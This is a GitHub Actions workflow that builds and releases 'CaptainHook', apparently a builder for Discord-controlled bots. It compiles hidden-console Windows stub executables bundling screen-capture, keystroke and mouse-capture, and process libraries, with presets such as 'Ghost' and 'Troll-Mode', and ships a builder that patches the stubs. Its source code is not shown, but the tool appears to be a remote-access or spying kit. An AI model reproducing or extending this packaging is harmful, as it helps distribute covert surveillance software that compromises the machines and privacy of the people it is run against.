name: Release Binaries

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build-stubs:
    runs-on: windows-latest
    strategy:
      matrix:
        preset: ["Full-Throttle", "Ghost", "The Tester", "Troll-Mode"]

    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          cache: 'pip'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller discord.py aiohttp mss psutil pyautogui pynput ping3 rich cryptography

      - name: Build Stub Binary
        shell: bash
        env:
          STUB_BUILD: 1
        run: |
          # Create staging
          mkdir -p build_staging
          cp -r src build_staging/
          
          # Clean name for the binary (no spaces)
          SAFE_NAME=$(echo "${{ matrix.preset }}" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')
          
          pyinstaller --onefile --noconsole --name stub_${SAFE_NAME} --paths=build_staging --collect-all discord --collect-all mss build_staging/src/client/main.py
          
          mkdir -p stubs
          cp dist/stub_${SAFE_NAME}.exe stubs/

      - name: Upload Stub Artifact
        uses: actions/upload-artifact@v4
        with:
          name: stub-${{ matrix.preset }}
          path: stubs/

  build-builder:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [windows-latest, ubuntu-latest, macos-latest]

    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller rich

      - name: Build Standalone Builder
        run: |
          pyinstaller --onefile --name CaptainHookBuilder src/builder/main.py

      - name: Upload Builder Artifact
        uses: actions/upload-artifact@v4
        with:
          name: builder-${{ matrix.os }}
          path: dist/CaptainHookBuilder*

  release:
    needs: [build-stubs, build-builder]
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/')
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts

      - name: Organize & Package Release
        run: |
          mkdir -p release_pkgs
          
          # 1. Windows Package
          mkdir -p win_pkg/stubs
          cp artifacts/builder-windows-latest/CaptainHookBuilder.exe win_pkg/
          cp artifacts/stub-*/*.exe win_pkg/stubs/
          zip -r release_pkgs/CaptainHook_Windows.zip win_pkg/*
          
          # 2. Linux Package
          mkdir -p linux_pkg/stubs
          cp artifacts/builder-ubuntu-latest/CaptainHookBuilder linux_pkg/
          cp artifacts/stub-*/*.exe linux_pkg/stubs/ # Stubs are .exe but work for patching
          zip -r release_pkgs/CaptainHook_Linux.zip linux_pkg/*
          
          # 3. macOS Package
          mkdir -p mac_pkg/stubs
          cp artifacts/builder-macos-latest/CaptainHookBuilder mac_pkg/
          cp artifacts/stub-*/*.exe mac_pkg/stubs/
          zip -r release_pkgs/CaptainHook_Mac.zip mac_pkg/*

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          files: release_pkgs/*.zip
          body: |
            ⚓ **CaptainHook v0.1.0 Official Release**
            
            Download the ZIP for your OS, extract it, and run the `CaptainHookBuilder`.
            The bot will be generated instantly using the included stubs.
            
            **Note:** Stubs are currently pre-compiled for Windows (.exe).
